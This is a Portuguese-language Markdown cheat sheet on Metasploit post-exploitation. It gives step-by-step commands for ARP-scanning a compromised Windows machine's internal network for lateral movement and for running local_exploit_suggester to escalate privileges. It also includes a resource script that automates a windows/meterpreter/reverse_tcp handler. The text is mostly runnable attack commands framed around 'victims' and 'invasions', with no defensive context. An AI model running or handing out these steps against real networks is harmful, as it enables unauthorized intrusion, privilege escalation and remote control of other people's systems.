
![Banner Dark Tech](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHR4MXdvdWo2eXA3bzdkOGVoM2U4ODd6dTU0aXF5bHNjajB5NXByYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/26xBFY0CIpA4ImXFm/giphy.gif)

# 🌐 NETWORK PIVOTING & AUTOMATION 

> **[!] GOAL:** Mapear a rede interna (Lateral Movement) e automatizar tarefas repetitivas.

---

## 🛰️ 01. ARP SCANNER: O MAPA DA REDE INTERNA
Uma vez dentro da máquina alvo, ela se torna nossa "sonda" para descobrir outros dispositivos na rede que não são visíveis da internet.

```bash
msf > use post/windows/gather/arp_scanner
msf > set session <ID>
msf > set rhosts <IP_DA_REDE/24>  # Ex: 192.168.1.0/24
msf > run
```
Target: Descobrir impressoras, servidores e outras estações na LAN da vítima.


## 🧠 02. LOCAL EXPLOIT SUGGESTER: A INTELIGÊNCIA

Este módulo analisa o sistema da vítima em busca de vulnerabilidades específicas que nós podemos ter deixado passar.

```bash
msf > use post/multi/recon/local_exploit_suggester
msf > set session <ID>
msf > set showdescription true
msf > run
```
Outcome: Ele lista exatamente quais exploits têm maior chance de sucesso para elevar seu privilégio.

## ⚡ 03. AUTOMATION: RESOURCE SCRIPTS (.RC)

Scripts .rc são sequências de comandos que o Metasploit executa automaticamente. Ideal para não ter que digitar tudo de novo em cada invasão.,

Crie um arquivo (ex: config.rc) com os comandos:

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <IP>
set lport <PORTA>
run
```
Execução:
```bash
msfconsole -r config.rc
```


* **Por que o ARP Scanner é foda?** Porque muitas vezes o servidor de arquivos da empresa não tem internet, mas a máquina que você invadiu tem acesso a ele. Com o `arp_scanner`, você descobre esse servidor escondido.
* **O "Suggester" é o seu melhor amigo:** Em vez de ficar testando 50 exploits e correndo o risco de travar a máquina da vítima, o `local_exploit_suggester` te dá o caminho das pedras.
* **Scripts .rc:** Isso é o que separa quem está "brincando" de quem está "trabalhando". Automatizar o seu Handler economiza um tempo precioso.
